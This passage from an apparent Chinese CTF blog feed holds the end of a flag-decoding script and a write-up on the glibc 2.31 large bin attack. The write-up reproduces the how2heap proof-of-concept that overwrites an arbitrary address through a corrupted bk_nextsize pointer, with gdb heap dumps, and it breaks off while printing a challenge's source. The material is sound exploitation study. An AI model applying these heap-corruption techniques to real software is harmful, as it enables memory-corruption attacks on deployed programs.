class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"></span><br><span class="line">tmp = <span class="string">'7G5d5bAy+TMdLWlu5CdkMTlcJnwkNUgb2AQL3CcmPpVf6DAp72scOSlb'</span></span><br><span class="line">tmp2 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">index = table.index(i)</span><br><span class="line">tmp2 += table2[index]</span><br><span class="line"></span><br><span class="line">k=base64.b64decode(tmp2+<span class="string">'=='</span>)</span><br><span class="line">nre=<span class="string">''</span></span><br><span class="line">kk=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(k)):</span><br><span class="line">    kk.append(ord(k[i]))</span><br><span class="line"></span><br><span class="line">print(kk)</span><br><span class="line">a2=len(kk)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range((<span class="number">10</span>)):</span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(kk)):</span><br><span class="line"></span><br><span class="line">        print(str(a2%i)+<span class="string">''</span>+str(i))</span><br><span class="line">        <span class="keyword">if</span> a2%i!=<span class="number">0</span>:</span><br><span class="line">            kk[j]^=(i+j)</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            kk[j]^=((j%i)+j)</span><br><span class="line">    print(kk)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(k)</span></span><br><span class="line">print(kk)</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (kk):</span><br><span class="line">    flag+=chr(i)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h3><p>填完表就有flag</p><p><img src="image-20211127162357150.png" alt="image-20211127162357150"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;周末抽空看下了，感觉难度差异太大，涝的涝死旱的旱死，太菜了.( ┬o┬)…</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Large bin Attack for Glibc 2.31 学习</title>
    <link href="lexsd6.github.io/2021/11/07/Largebin%20Attack%20for%20Glibc%202.31%20%E5%AD%A6%E4%B9%A0/"/>
    <id>lexsd6.github.io/2021/11/07/Largebin%20Attack%20for%20Glibc%202.31%20%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-11-07T15:06:30.390Z</published>
    <updated>2021-11-08T13:30:17.619Z</updated>
    
    <content type="html"><![CDATA[<p>一直以为在2.31补丁后，Large bin Attack 就无法使用了。在打比赛bsidesahmedabad CTF时，才发现原来在2.31 下也有骚操作来利用Large bin来进行attack。（唉<del>~</del>(◞‸◟ )tcl…）<a id="more"></a></p><h2 id="Large-bin-Attack目的"><a href="#Large-bin-Attack目的" class="headerlink" title="Large bin Attack目的"></a>Large bin Attack目的</h2><p>Large bin Attack的目的是 利用Large bin 向任意一地址任意一个地址写入一个大数(p2 chunk addr).</p><h2 id="how2heap-源码学习"><a href="#how2heap-源码学习" class="headerlink" title="how2heap 源码学习"></a>how2heap 源码学习</h2><p>经过信息收集，发现在how2heap中更新了Large bin Attack 源码。(ps:菜鸡才知道正版<a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">how2heap</a>项目有团队在不断维护，中文翻译版how2heap已经没有维护了，啊这…..)</p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span></span><br><span class="line"><span class="comment">        fwd = bck;</span></span><br><span class="line"><span class="comment">        bck = bck-&gt;bk;</span></span><br><span class="line"><span class="comment">        victim-&gt;fd_nextsize = fwd-&gt;fd;</span></span><br><span class="line"><span class="comment">        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Check 1 : \n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt;        malloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Check 2 : \n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt;    if (bck-&gt;fd != fwd)\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt;        malloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"This prevents the traditional large bin attack\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"====================================================================\n\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Here is the target we want to overwrite (%p) : %lu\n\n"</span>,&amp;target,target);</span><br><span class="line">  <span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"First, we allocate a large chunk [p1] (%p)\n"</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"And another chunk to prevent consolidate\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"We also allocate a second large chunk [p2]  (%p).\n"</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"This chunk should be smaller than [p1] and belong to the same large bin.\n"</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Once again, allocate a guard chunk to prevent consolidate\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Free the larger of the two --&gt; [p1] (%p)\n"</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Allocate a chunk larger than [p1] to insert [p1] into large bin\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Free the smaller of the two --&gt; [p2] (%p)\n"</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"At this point, we have one chunk in large bin [p1] (%p),\n"</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"               and one chunk in unsorted bin [p2] (%p)\n"</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="keyword">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n"</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n"</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"  the modified p1-&gt;bk_nextsize does not trigger any error\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd-&gt;nexsize is overwritten to address of [p2] (%p)\n"</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n"</span>, p2<span class="number">-2</span>, (<span class="keyword">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Target (%p) : %p\n"</span>,&amp;target,(<span class="keyword">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"====================================================================\n\n"</span>);</span><br><span class="line"></span><br><span class="line">  assert((<span class="keyword">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="新保护"><a href="#新保护" class="headerlink" title="新保护"></a>新保护</h3><p>由上文源码所说，在2.30后libc 增加了两个检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#check 1：</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n<span class="string">");</span></span><br><span class="line">  malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)\n");</span><br><span class="line"><span class="meta">#check 2:</span></span><br><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">malloc_printerr (<span class="string">"malloc(): largebin double linked list corrupted (bk)"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"This prevents the traditional large bin attack\n"</span>);</span><br></pre></td></tr></table></figure><p>先说check 2：对当前bin的bk值对应bin的 fd是否为当前bin。</p><p>check 1 对largebin的bk_nextsize进行了跟bk一样的检查，即当前bin的bk_nextsize值对应bin的 fd_nextsize是否为当前bin。</p><h3 id="新利用点"><a href="#新利用点" class="headerlink" title="新利用点"></a>新利用点</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span>) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这源码中，核心就是利用这段代码。这部分完整的源码在<a href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L3831" target="_blank" rel="noopener">https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L3831</a></p><p>这个代码在unsorted bin加入largebin时，若unsorted bin 大小大于目前最大largebin时触发。在触发时，被未对<code>fd_nextsize</code>和<code>bk_nextsize</code>进行检查，就直接向<code>victim-&gt;bk_nextsize-&gt;fd_nextsize</code>写入victim的地址。</p><h3 id="流程梳理"><a href="#流程梳理" class="headerlink" title="流程梳理"></a>流程梳理</h3><p>首先我们如下写创建4个chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> target = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Here is the target we want to overwrite (%p) : %lu\n\n"</span>,&amp;target,target);</span><br><span class="line"><span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"First, we allocate a large chunk [p1] (%p)\n"</span>,p1<span class="number">-2</span>);</span><br><span class="line"><span class="keyword">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"And another chunk to prevent consolidate\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We also allocate a second large chunk [p2]  (%p).\n"</span>,p2<span class="number">-2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This chunk should be smaller than [p1] and belong to the same large bin.\n"</span>);</span><br><span class="line"><span class="keyword">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br></pre></td></tr></table></figure><p>然后：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"Free the larger of the two --&gt; [p1] (%p)\n"</span>,p1<span class="number">-2</span>);</span><br><span class="line"> <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"Allocate a chunk larger than [p1] to insert [p1] into large bin\n"</span>);</span><br></pre></td></tr></table></figure><p>让p1 加入了larger bin，此时:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">largebins</span><br><span class="line">0x400: 0x55f31dd5e5e0 —▸ 0x7f0c129bbfd0 (main_arena+1104) ◂— 0x55f31dd5e5e0</span><br></pre></td></tr></table></figure><p>然后释放p2:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"Free the smaller of the two --&gt; [p2] (%p)\n"</span>,p2<span class="number">-2</span>);</span><br><span class="line">p1[<span class="number">3</span>] = (<span class="keyword">size_t</span>)((&amp;target)<span class="number">-4</span>);<span class="comment">//修改p1 bk_nextsize 为target+0x20</span></span><br></pre></td></tr></table></figure><p>此时p2为unsortedbin：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: 0x55f31dd5ea30 —▸ 0x7f0c129bbbe0 (main_arena+96) ◂— 0x55f31dd5ea30</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x400: 0x55f31dd5e5e0 —▸ 0x7f0c129bbfd0 (main_arena+1104) ◂— 0x55f31dd5e5e0</span><br></pre></td></tr></table></figure><p>此时P1的内存分布为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;36gx 0x55f31dd5e5e0</span><br><span class="line">0x55f31dd5e5e0: 0x0000000000000000      0x0000000000000431</span><br><span class="line">0x55f31dd5e5f0: 0x00007f0c129bbfd0      0x00007f0c129bbfd0</span><br><span class="line">0x55f31dd5e600: 0x000055f31dd5e5e0      0x00007f0c129bee30 （target+0x20)</span><br><span class="line">0x55f31dd5e610: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f31dd5e620: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f31dd5e630: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>然后我们再让p2进入larger bin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n"</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br></pre></td></tr></table></figure><p>这时，由于p1&gt;p2,我们的攻击将进行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line"><span class="comment">//victim在例子中p2</span></span><br><span class="line"><span class="comment">//victim-&gt;bk_nextsize-&gt;fd_nextsize 为我们修改的p1-&gt;bk_nextsize的值</span></span><br><span class="line"><span class="comment">//fwd-&gt;fd-&gt;bk_nextsize为p1-&gt;bk_nextsize</span></span><br></pre></td></tr></table></figure><p>,在target处写入p2地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7f0c129bee30:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f0c129bee40:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f0c129bee50:   0x000055f31dd5ea30      0x0000000000000000</span><br><span class="line">0x7f0c129bee60:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f0c129bee70:   0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="例题-bsidesahmedabad-2021-padnote"><a href="#例题-bsidesahmedabad-2021-padnote" class="headerlink" title="例题_bsidesahmedabad_2021_padnote"></a>例题_bsidesahmedabad_2021_padnote</h2><p>题目环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>题目源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHECK_FAIL(ERR) &#123;                       \</span></span><br><span class="line">    <span class="built_in">puts</span>(ERR);                                  \</span><br><span class="line">    <span class="keyword">return</span>;                                     \</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_NOTE 4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">size</span>;</span><br><span class="line">  <span class="keyword">char</span> *content;</span><br><span class="line">&#125; Note;</span><br><span class="line"></span><br><span class="line">Note noteList[MAX_NOTE];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ReadLine</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> <span class="built_in">size</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> c;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i != <span class="built_in">size</span> - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">read</span>(<span class="number">0</span>, &amp;c, <span class="keyword">sizeof</span>(c)) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>); <span class="comment">// IO 